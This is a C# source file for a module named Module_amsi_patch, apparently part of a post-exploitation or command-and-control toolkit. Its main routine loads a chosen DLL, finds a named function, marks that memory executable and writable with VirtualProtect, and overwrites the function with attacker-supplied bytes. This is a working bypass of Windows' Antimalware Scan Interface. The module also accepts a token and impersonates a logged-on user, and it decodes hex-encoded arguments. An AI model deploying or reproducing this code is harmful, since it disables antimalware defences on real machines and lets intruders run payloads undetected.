using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.ComponentModel;


public class Module_amsi_patch
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
    public static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

    public string[] doAmsPatch(string patchFunc, string patchContent, string patchFile)
    {
        string result = "";

        try
        {
            if (!File.Exists(patchFile))
                throw new Exception("File: '" + patchFile + "' not exists");

            IntPtr ptrLibrary = LoadLibrary(patchFile);
            if (ptrLibrary == IntPtr.Zero)
                throw new Exception("Can't get handle from LoadLibrary");

            IntPtr ptrFunctionAddress = GetProcAddress(ptrLibrary, patchFunc);
            if (ptrFunctionAddress == IntPtr.Zero)
                throw new Exception("Can't get handle from GetProcAddress");

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(ptrFunctionAddress, dwSize, 0x40, out Zero))
                throw new Exception("Can't set PAGE_EXECUTE_READWRITE with VirtualProtect");

            string[] patchContentRaw = patchContent.Split(',');
            byte[] patchContentBytes = new byte[patchContentRaw.Length];
            for (int i = 0; i < patchContentRaw.Length; i++)
            {
                patchContentBytes[i] = Convert.ToByte(patchContentRaw[i], 16);
            }

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);

            Marshal.Copy(patchContentBytes, 0, unmanagedPointer, 6);
            MoveMemory(ptrFunctionAddress, unmanagedPointer, 6);

            result = "Function: '" + patchFunc + "' of file: " + patchFile + "' has been patched" + Environment.NewLine;
        }
        catch(Exception ex)
        {
            result += "An error has occurred in AMSI Patch: '" + ex.Message + "'" + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        string result = "";
        List<string> nargs = new List<string>(args);
        
        if (nargs.Count != 3)
        {
            result = "Invalid arguments provided. Specify resources to use." + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }
        return doAmsPatch(args[0], args[1], args[2]);
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void go_dm(string cwd, string args, string token)
    {
        Module_amsi_patch m = new Module_amsi_patch();
        String[] results = m.go(cwd, args, token);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }

    public static void Main(string[] args)
    {
        Module_amsi_patch m = new Module_amsi_patch();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}